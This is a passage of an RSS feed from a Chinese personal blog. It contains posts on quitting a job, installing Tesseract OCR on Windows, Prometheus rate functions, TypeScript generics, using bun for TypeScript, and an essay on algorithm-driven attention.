      <link>https://wdd.js.org/posts/2024/leave-the-second-job/</link>
      <pubDate>Tue, 10 Sep 2024 21:08:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/leave-the-second-job/</guid>
      <description>&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;第二份工作快到一年了，我最近申请离职了。&lt;/p&gt;
&lt;p&gt;同事问我离职原因，我说被领导骂了，感觉自尊受辱，索性不干了。&lt;/p&gt;
&lt;p&gt;实际上被领导骂只是压死骆驼的最后一根稻草，我也不是那种会心血来潮说干就不干的。&lt;/p&gt;
&lt;p&gt;这份工作，我做了不到一年，大部分的时间我是做的不开心的。&lt;/p&gt;
&lt;p&gt;所以离职是一直在心里酝酿。&lt;/p&gt;
&lt;p&gt;为什么会工作不开心？&lt;/p&gt;
&lt;p&gt;主要原因有以下四点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;行业前景暗淡&lt;/strong&gt;：S公司处在行业的中游，上游受到运营商管控，下游在客户层面话语权也不大。这是一个资源限制型的行业，行业的命脉就在运营商，可能运营商有个风吹草动，整个行业就要翻江倒海。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自研能力薄弱&lt;/strong&gt;：S公司大部分业务都是购买的第三方的软件，各种变更都受到制约，添加一个小功能都要付费升级。自研能力弱的一个原因可能就是前些年赚钱太容易了，投资研发哪有赚快钱来的舒服呢。同时也是这个原因，多个第三方软件之间也造成了数据割裂，运行维护困难。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;家族企业制约&lt;/strong&gt;：S公司大部分人员都是老板的亲朋好友，家族式企业的优点是内聚力强，但是包容性弱。之前也有一些大厂进来的员工，没多久就辞职了。 我曾经也跟老板沟通过，似乎老板也有心做些变革。但是变革哪有那么容易，要变革不早都变了，还要等到现在？&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;短期主义&lt;/strong&gt;：似乎S公司没有什么具体的愿景，唯一感觉到的愿景就是赚快钱。一旦发现投入的回报太少，就立即切换目标。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;企业关怀差&lt;/strong&gt;：说实在，我没有感觉到多少员工关怀。在S公司的工作和在地主家做短工也没啥区别，老板想什么都要管，但是即管不了那么多，又管的不好。所以给人的感觉就是东一棒槌，西一榔头，看起来很卖力，实际上并没有什么产出。几乎每个月都有人离职，对员工都吝啬，不考虑员工的自尊，员工怎么可能对公司有归属感。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工作压力大&lt;/strong&gt;：受限于资源收紧、产品优势小，老板想提高营业额的方法是提高员工的服务水平。说实在，这真是杯水车薪。不想着从底层系统的解决问题，只想着通过给员工压力、通过加班来解决问题，只会造成工作压力大、人员流失大。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以，我的离职，实际上也是考虑再三的一个选择。&lt;/p&gt;
&lt;p&gt;当然，我在S公司也不是什么收获都没有。&lt;/p&gt;
&lt;h1 id=&#34;收获总结&#34;&gt;收获总结&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;深入了解了行业的运行原理、客户、资源、政策等信息&lt;/li&gt;
&lt;li&gt;对于数据分析方面有了较大的进步，毕竟我做了40+个数据报表来分析运行数据&lt;/li&gt;
&lt;li&gt;深入学习了python, 主要用来做数据分析。数据分析方面的协议栈主要有pandas、duckdb、doris(MySQL)、grafana来组成&lt;/li&gt;
&lt;li&gt;深入学习了python的GUI开发，主要用到的框架是wxPython，开发的两个工具分别给到运维人员和客服去使用，来提高运行效率&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Windows安装Tesserocr</title>
      <link>https://wdd.js.org/posts/2024/windows-install-tesserocr/</link>
      <pubDate>Wed, 24 Apr 2024 08:34:07 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/windows-install-tesserocr/</guid>
      <description>&lt;h1 id=&#34;安装tesserocr-windows_build&#34;&gt;安装tesserocr-windows_build&lt;/h1&gt;
&lt;p&gt;到&lt;a href=&#34;tesserocr-windows_build&#34;&gt;tesserocr-windows_build release&lt;/a&gt;页面下载对应的whl文件&lt;/p&gt;
&lt;p&gt;如下载 tesserocr-2.6.2-cp312-cp312-win_amd64.whl， 下载之后用pip安装&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip install tesserocr-2.6.2-cp312-cp312-win_amd64.whl
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;安装ocr-windows-exe程序&#34;&gt;安装ocr windows exe程序&lt;/h1&gt;
&lt;p&gt;在这个页面，有对应的exe程序，https://digi.bib.uni-mannheim.de/tesseract/&lt;/p&gt;
&lt;p&gt;例如下载这个exe文件 &lt;a href=&#34;https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v5.3.0.20221214.exe&#34;&gt;https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v5.3.0.20221214.exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载完成之后点击安装，一般我们不需要修改他的安装位置，默认的安装位置是C:\Program Files\Tesseract-OCR&lt;/p&gt;
&lt;p&gt;我们将C:\Program Files\Tesseract-OCR\tessdata下的所有文件，复制到C:\Program Files\Tesseract-OCR\目录下&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/simonflueckiger/tesserocr-windows_build/releases&#34;&gt;https://github.com/simonflueckiger/tesserocr-windows_build/releases&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://digi.bib.uni-mannheim.de/tesseract/&#34;&gt;https://digi.bib.uni-mannheim.de/tesseract/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tesseract-ocr.github.io/tessdoc/Downloads.html&#34;&gt;https://tesseract-ocr.github.io/tessdoc/Downloads.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/Yuyh131/article/details/103880585&#34;&gt;https://blog.csdn.net/Yuyh131/article/details/103880585&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>使用Excel理解prometheus的变化率相关函数</title>
      <link>https://wdd.js.org/posts/2024/learn-prom-with-excel/</link>
      <pubDate>Sat, 16 Mar 2024 08:38:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/learn-prom-with-excel/</guid>
      <description>&lt;h1 id=&#34;counter类型的变化率-rate-irate-increase&#34;&gt;counter类型的变化率 rate, irate, increase&lt;/h1&gt;
&lt;p&gt;counter类型一般是只增不减的累积值，例如系统累计的http请求数量, 累计的话单数量。&lt;/p&gt;
&lt;p&gt;counter类型的指标变化率一般使用三个函数来计算，rate, irate, increase&lt;/p&gt;
&lt;p&gt;指标每隔15s采样一次数据, A列是采集的指标值，B列是对应的采集时间。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;demo_api_request_duration_seconds_count&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;instance&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;demo-service-0:10000&amp;#34;&lt;/span&gt;,path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/api/bar&amp;#34;&lt;/span&gt;,status&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt;,method&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}[&lt;/span&gt;1m&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;序号&lt;/th&gt;
          &lt;th&gt;A&lt;/th&gt;
          &lt;th&gt;B&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;294401976&lt;/td&gt;
          &lt;td&gt;1710549816.105&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;294402185&lt;/td&gt;
          &lt;td&gt;1710549831.105&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;294402393&lt;/td&gt;
          &lt;td&gt;1710549846.105&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;294402599&lt;/td&gt;
          &lt;td&gt;1710549861.105&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;rate是计算每秒的变化率,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rate 计算方案 (A4-A1) / (B4-B1)， 这里选择了首尾两个值的差值，除以时长秒&lt;/li&gt;
&lt;li&gt;irate 计算方案 (A4-A3) / (B4-B3) , 这里只选择里最后两个点的差值，除以时长秒&lt;/li&gt;
&lt;li&gt;increase 计算方式 (A4-A1) / (B4-B1) * 60,  这里的60是1m,  其实increase就是rate() * windows_seconds的语法糖&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;guage&#34;&gt;guage&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;296164749 @1710648381.105
296165055 @1710648396.105
296165364 @1710648411.105
296165668 @1710648426.105
296165978 @1710648441.105
296166186 @1710648456.105
296166505 @1710648471.105
296166826 @1710648486.105
296167151 @1710648501.105
296167478 @1710648516.105
296167810 @1710648531.105
296168139 @1710648546.105
296168472 @1710648561.105
296168764 @1710648576.105
296169026 @1710648591.105
296169363 @1710648606.105
296169709 @1710648621.105
296170059 @1710648636.105
296170410 @1710648651.105
296170759 @1710648666.107
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>什么时候应该使用ts范型?</title>
      <link>https://wdd.js.org/posts/2023/when-to-use-ts-generics/</link>
      <pubDate>Thu, 28 Dec 2023 20:21:11 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/when-to-use-ts-generics/</guid>
      <description>&lt;p&gt;我知道ts支持范型，但是因为几乎用不到，所以对于范型对我来说往往蒙上一层神秘色彩。&lt;/p&gt;
&lt;p&gt;最近我才真正的体会到范型的真正威力。&lt;/p&gt;
&lt;p&gt;下面就介绍我的使用场景。&lt;/p&gt;
&lt;p&gt;在和后端接口交互的时候， 后端接口返回的数据都是如下的类型。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XData&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;any&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我把result定义为any类型，因为它的具体类型是由接口确定的。 比如查话单的接口是话单的结构类型，查订单的接口返回的是订单的类型。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CDR&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;creatAt&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Order&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在不用范型的时候，我们要么定义如下两个interface&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XDataCDR&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;CDR&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XDataOrder&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;Order&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在使用axios的时候，对于响应体的data, 可以使用如下的方式声明data&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getCDR&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;axios&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;get&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;XDataCDR&lt;/span&gt;&amp;gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/api/xxx&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是，如果我们稍微修改一下XData的类型声明，加上范型。 就不需要用到XDataCDR和XDataOrder两个接口。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XData&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;T&lt;/span&gt;&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;T&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getCDR&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;axios&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;get&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;XData&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;CDR&lt;/span&gt;&amp;gt;&amp;gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/api/xxx&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只需要用到&lt;code&gt;XData&amp;lt;CDR&amp;gt;&lt;/code&gt;就可以构造出新的类型。&lt;/p&gt;
&lt;p&gt;从上面可以看出范型实际上不是约束具体的值的，而是用来对类型进行约束。使用范型，可以减少大量重复的代码。&lt;/p&gt;
&lt;p&gt;范型一般用于关键词之后，例如interface名之后，函数名之后。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;X&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;T&lt;/span&gt;&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;T&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;say&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;T&lt;/span&gt;&amp;gt;() &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;T&lt;/span&gt;[] {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以，有些功能，直到真正用到，才能真正理解。&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用bun加速开发环境的ts编写</title>
      <link>https://wdd.js.org/posts/2023/typescript-with-bun/</link>
      <pubDate>Sat, 23 Dec 2023 15:04:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/typescript-with-bun/</guid>
      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
&lt;p&gt;最近我在开发一个demo程序，为了加速开发，我觉得直接用js要比用typescript更快，而且这只是一个demo程序，杀鸡焉用牛刀。&lt;/p&gt;
&lt;p&gt;而且一旦我要用typescript开发，避免不了要各种配置，例如typescript, ts-node, nodemon之类的，很是繁琐。而且ts也必须要经过编译后才能运行。&lt;/p&gt;
&lt;p&gt;然而，直到遇到一个bug,  我排查了半天，才发现是一个对象的属性写错了。本身这个对象是没有这个属性的，js没有任何错误提示。我只能一步一步缩小代码的范围，最终才定位到是属性拼写的错误。&lt;/p&gt;
&lt;p&gt;这个拼写的错误，应该是vscode的智能补全，给出的提示词，我直接回车确认了。&lt;/p&gt;
&lt;p&gt;这件事给我一个教训：&lt;strong&gt;以后所有代码都要用ts去编写。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接用js去编写虽然看起来写的快，但是代码调试太痛苦了。 这种拼写错误，ts的智能提示会直接告诉你错误的地方，但是如果去排查js文件，花费的时间是无法估量的。&lt;/p&gt;
&lt;p&gt;但是我又不太想去配置各种ts的执行环境，就想起来之前曾经用的&lt;a href=&#34;https://bun.sh/&#34;&gt;bun&lt;/a&gt;这个ts执行工具。&lt;/p&gt;
&lt;p&gt;虽然bun这个工具才刚刚发布1.0版本，但是在开发环境使用也是足够了。&lt;/p&gt;
&lt;p&gt;我的设想是在开发环境用bun, 在生产环境用nodejs执行bun编译后的js代码。&lt;/p&gt;
&lt;p&gt;这个demo程序用bun去运行的时候，没发现任何兼容问题。 这也让我有了继续研究下去的信心。&lt;/p&gt;
&lt;h1 id=&#34;bun的开发环境&#34;&gt;bun的开发环境&lt;/h1&gt;
&lt;p&gt;我之前看过deno, 但是看多deno的官方文档后，发现并不符合我的胃口。 但是bun的文档写的很好。&lt;/p&gt;
&lt;p&gt;任何工具的第一步都是安装，但是bun似乎在windows上执行并不太好，所以我是用windows的linux子系统，或者在mac上安装的bun。&lt;/p&gt;
&lt;p&gt;具体的安装步骤可以参考，https://bun.sh/docs/installation&lt;/p&gt;
&lt;h1 id=&#34;项目初始化&#34;&gt;项目初始化&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bun init

bun init helps you get started with a minimal project and tries to
guess sensible defaults. Press ^C anytime to quit.

package name (quickstart):
entry point (index.ts):

Done! A package.json file was saved in the current directory.
 + index.ts
 + .gitignore
 + tsconfig.json (for editor auto-complete)
 + README.md

To get started, run:
  bun run index.ts
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用bun运行index.ts&lt;/p&gt;</description>
    </item>
    <item>
      <title>算法 - 入侵脑细胞</title>
      <link>https://wdd.js.org/posts/2023/the-cell/</link>
      <pubDate>Tue, 21 Nov 2023 20:35:02 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/the-cell/</guid>
      <description>&lt;p&gt;我以前看过一部电影，叫做&lt;a href=&#34;https://movie.douban.com/subject/1293171/&#34;&gt;《入侵脑细胞》&lt;/a&gt;，这部电影提供一种可能性。类似的电影还有《盗梦空间》，都是将一种思想植入别人的思想中。&lt;/p&gt;
&lt;p&gt;这两部电影虽然提供了可能性，但是却无法提供实际可操作的方案。&lt;/p&gt;
&lt;p&gt;最近在阅读的一本书也于此有关，叫做&lt;a href=&#34;https://book.douban.com/subject/35264809/&#34;&gt;《对不起，我操控了你的大脑》&lt;/a&gt;，是一个叫做剑桥分析、曾轰动世界的公司，利用基于大数据、算法、人工智能、心理学来做思想植入的。常见的领域如操纵大选，并且提供成功的案例。&lt;/p&gt;
&lt;p&gt;但是作为普通人，大规模的思想植入似乎里我们还是比较遥远。&lt;/p&gt;
&lt;p&gt;但是真的那么遥远吗？&lt;/p&gt;
&lt;p&gt;昨天我爸来看我，之前他总是抱怨手机流量不够用。我给他换了每个月180G的流量卡，才过没两三天，他说已经用了20多G了。按照这个速度，180G的流量也不够用一个月。&lt;/p&gt;
&lt;p&gt;我问：“你怎么会用那么多流量！，你用手机看视频的吗？”&lt;/p&gt;
&lt;p&gt;爸说：“我经常刷抖音，刷好久，刷的眼疼”&lt;/p&gt;
&lt;p&gt;我说：“你还是少刷点手机吧”，虽然这只是苍白无力的 一句关心。&lt;/p&gt;
&lt;p&gt;我爸生于70年代，没怎么读过书，小学文凭。现在年近五十，经常带着鸭舌帽，依然遮不住后脑勺斑白的头发。虽然他经常用手机，但是很多东西依然搞不明白，需要找身边的年轻人来帮忙设置手机。&lt;/p&gt;
